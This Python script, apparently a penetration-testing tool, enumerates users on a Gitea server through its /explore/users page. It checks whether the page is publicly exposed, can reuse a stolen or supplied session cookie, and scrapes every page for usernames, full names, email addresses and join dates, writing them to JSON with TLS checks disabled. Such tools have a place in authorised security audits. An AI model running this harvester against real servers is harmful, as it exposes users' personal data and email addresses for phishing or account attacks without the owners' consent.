#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : gitea-extract-users.py
# Author             : Podalirius (@podalirius_)
# Date created       : 20 Dec 2022


import argparse
import datetime
import json
import sys
from bs4 import BeautifulSoup
import requests
requests.packages.urllib3.disable_warnings()
requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
try:
    requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
except AttributeError:
    pass


def can_access_unauthenticated(target, cookie=None):
    url = target + "/explore/users"

    cookies = {'lang': 'en-US'}
    if cookie != None:
        cookies['i_like_gitea'] = cookie

    r = requests.get(url, cookies=cookies, verify=False)

    if r.status_code == 404:
        print('\x1b[1;91m[404]\x1b[0m No /explore/users found on this server.')
        print('\x1b[1m[\x1b[93m+\x1b[0m\x1b[1m]\x1b[0m Exiting ...')
        sys.exit(-1)

    if b"You are not allowed to view users publicly." in r.content or b"Username or Email Address" in r.content:
        return False
    else:
        return True


def extract_gitea_users(target):
    data = {"target": target, "users": []}

    page_number = 1
    continue_crawling = True
    while continue_crawling:
        url = target + "/explore/users?sort=alphabetically&page=%d&q=&tab=" % page_number
        r = requests.get(
            url,
            cookies=cookies,
            verify=False
        )
        
        target_content = [b"No matching users found.", bytes("Aucun utilisateur correspondant n'a été trouvé.", 'UTF-8')]
        if any((match := substring) in r.content for substring in target_content):
            print('\n[+] Done processing.')
            continue_crawling = False
        else:
            print('\r   [>] Parsing page %d (extracted %d users yet)...' % (page_number, len(data['users'])), end="")

            soup = BeautifulSoup(r.content, 'lxml')
            s = soup.find('div', attrs={'class': 'user'})

            if s is None:
                print("\n[!] Could not find users on this page.")
                return None

            for user_parser in s.find_all('div', attrs={'class': 'content'}):
                user = {}
                descr = user_parser.find('div', attrs={'class': 'description'})
                # Parsing mail if exists
                if 'mailto:' in str(descr):
                    mail = descr.find('a')['href'].replace('mailto:', '')
                else:
                    mail = ""
                user['mail'] = mail
                #
                user['username'] = user_parser.find('span', attrs={'class': 'header'}).find("a").text.strip()
                user['fullname'] = str(user_parser.find('span', attrs={'class': 'header'})).split('</a>', 1)[1].split('</span>', 1)[0].strip()

                # if 'location' in str(descr):
                #     user['location'] = [e for e in str(user_parser).split('\n') if "location" in e]
                #     print(user['location'])
                # else :
                #     user['location'] = ""
                # Parsing location if exists
                if 'Joined on' in str(descr):
                    joined = str(user_parser).strip().split('Joined on')[1].split('<')[0].strip()
                else:
                    joined = ""
                user['joined'] = joined
                #
                data['users'].append(user)
            page_number += 1

    return data


def parseArgs():
    print("Dump GiTea users via /explore/users endpoint - v1.1 - by Remi GASCOU (Podalirius)\n")
    parser = argparse.ArgumentParser(description="Dump GiTea users via /explore/users endpoint")
    parser.add_argument('-t', '--target', required=True, help='IP address or hostname of the GiTea to target.')
    parser.add_argument('-o', '--outfile', required=False, default=None, help='Output JSON file of all the found users.')
    parser.add_argument('-c', '--cookie', required=False, default=None, help='i_like_gitea cookie to dump users in authenticated mode.')
    return parser.parse_args()


if __name__ == '__main__':
    options = parseArgs()

    options.target = options.target.rstrip("/")
    if not options.target.startswith(("http://", "https://")):
        options.target = f"https://{options.target}"

    print('[+] Target : %s \n' % options.target)

    cookies = {'lang': 'en-US'}
    if options.cookie is None:
        print('[+] Checking if /explore/users is public or not ...')
        vulnerable = can_access_unauthenticated(options.target)
        if not vulnerable:
            print('[-] You need to be connected to access /explore/users on this server.')
            print('[+] Exiting ...')
        else:
            print('[+] Target appears to be vulnerable !')
    else:
        print('[+] Trying to access /explore/users authenticated with cookie: %s=%s \n' % ("i_like_gitea", options.target))
        cookies['i_like_gitea'] = options.cookie

    data = extract_gitea_users(target=options.target)

    if data is not None:
        if options.outfile is None:
            domain = options.target.split('/')[2]
            options.outfile = 'GiTea_users_%s_%s.json' % (domain, datetime.datetime.now().strftime('%Y_%h_%d_%Hh%Mm%Ss'))
        print('[+] Writing results to %s' % options.outfile)
        f = open(options.outfile, "w")
        f.write(json.dumps(data, indent=4))
        f.close()

    print('[+] All done !')
